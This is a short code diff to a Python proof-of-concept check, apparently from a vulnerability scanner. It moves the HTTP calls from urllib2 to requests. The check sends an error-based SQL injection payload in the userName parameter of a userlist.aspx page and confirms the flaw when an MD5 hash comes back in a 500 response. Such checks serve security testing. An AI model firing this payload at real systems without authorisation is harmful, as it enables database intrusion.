@@ -34,10 +34,9 @@ class Poc(ABPoc):
             
             payload = "/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&RelatedUserType=Friends&UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&userName=1%27and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"
             verify_url = self.target + payload
-            req = urllib2.Request(verify_url)
-            content = urllib2.urlopen(req).read()
+            req = requests.get(verify_url)
             
-            if req.getcode() == 500 and '81dc9bdb52d04dc20036dbd8313ed055' in content:
+            if req.status_code == 500 and '81dc9bdb52d04dc20036dbd8313ed055' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
